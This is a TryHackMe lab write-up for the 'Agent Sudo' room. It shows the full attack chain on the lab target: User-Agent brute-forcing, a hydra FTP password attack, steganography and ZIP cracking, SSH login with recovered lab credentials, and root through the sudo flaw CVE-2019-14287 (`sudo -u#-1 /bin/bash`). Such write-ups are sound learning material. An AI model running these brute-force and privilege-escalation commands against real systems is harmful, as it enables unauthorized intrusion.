# 🕵️ Agent Sudo — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
![Category](https://img.shields.io/badge/Category-Enumeration%20%7C%20Brute--Force%20%7C%20Steganography%20%7C%20Privesc-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Pwned-red?style=flat-square)
![Author](https://img.shields.io/badge/Author-Obada%20Hamed-181717?style=flat-square)

> *A secret server lies deep under the sea. Your mission: infiltrate it, uncover hidden messages, and escalate privileges to reveal the final truth.*

---

## 🗺️ Attack Path

```
Nmap Scan → Web Enum (User-Agent Brute-Force) → FTP Brute-Force
→ Steganography → Password Cracking → SSH Access → Privesc (CVE-2019-14287)
```

---

## 0. Enumeration

### Nmap Scan

```bash
nmap -v <target-ip>
```

**Open ports:**

| Port | Service |
|------|---------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

### Web Enumeration

Visiting the homepage revealed:

```
Dear agents,
Use your own codename as user-agent to access the site.
From, Agent R
```

This hints that the `User-Agent` header must be set to an agent codename (A–Z).

Using **Burp Suite Intruder**, I brute-forced User-Agent values A → Z:
- Agent `R` → long warning response
- Agent `C` → 302 redirect to `agent_C_attention.php`

Visiting the redirected page:
```
Attention chris,
Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, it is weak!
From, Agent R
```

**Findings:**
- Username: `chris`
- Password hint: weak password

---

## 1. FTP Brute-Force

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
```

✅ Login successful.

**Files found:**
```
To_agentJ.txt
cute-alien.jpg
cutie.png
```

`To_agentJ.txt` hints that a real password is hidden inside the images.

---

## 2. Steganography

### Binwalk Analysis

```bash
binwalk cute-alien.jpg
binwalk cutie.png
```

`cutie.png` contains an **encrypted ZIP archive**.

```bash
binwalk -e cutie.png
```

Extracted:
```
365.zlib
8702.zip   ← important
```

### Cracking the ZIP Password

```bash
zip2john 8702.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

Password found → extracted file contains:
```
We need to send the picture to 'QXJlYTUx'
```

Decoding Base64:
```bash
echo QXJlYTUx | base64 -d
# Output: Area51
```

### Extracting from cute-alien.jpg

```bash
steghide --extract -sf cute-alien.jpg
# Password: Area51
```

Extracted `message.txt`:
```
Hi james,
Your login password is hackerrules!
Your buddy, chris
```

✅ SSH credentials obtained.

---

## 3. User Flag

```bash
ssh james@<target-ip>
```

User flag found in the home directory. The file `Alien_autospy.jpg` references the **Roswell incident**.

---

## 4. Privilege Escalation — CVE-2019-14287

```bash
sudo -l
```

User can run `/bin/bash` with sudo. The sudo version is vulnerable to **CVE-2019-14287**.

```bash
sudo -u#-1 /bin/bash
```

✅ Root shell obtained. Root flag retrieved from `/root/root.txt`.

---

## 5. Final Message

```
To Mr.hacker,
Congratulation on rooting this box. This box was designed for TryHackMe.
Tips, always update your machine.
By, Agent R
```

---

## 📋 Summary

| Technique | Tool Used |
|-----------|-----------|
| Port Scanning | Nmap |
| User-Agent Brute-Force | Burp Suite Intruder |
| FTP Brute-Force | Hydra |
| Steganography | Binwalk, Steghide |
| Password Cracking | John the Ripper |
| Privilege Escalation | CVE-2019-14287 (`sudo -u#-1`) |

> **Key lesson:** Always check for steganography when images are involved. And always check your sudo version — CVE-2019-14287 is a classic.
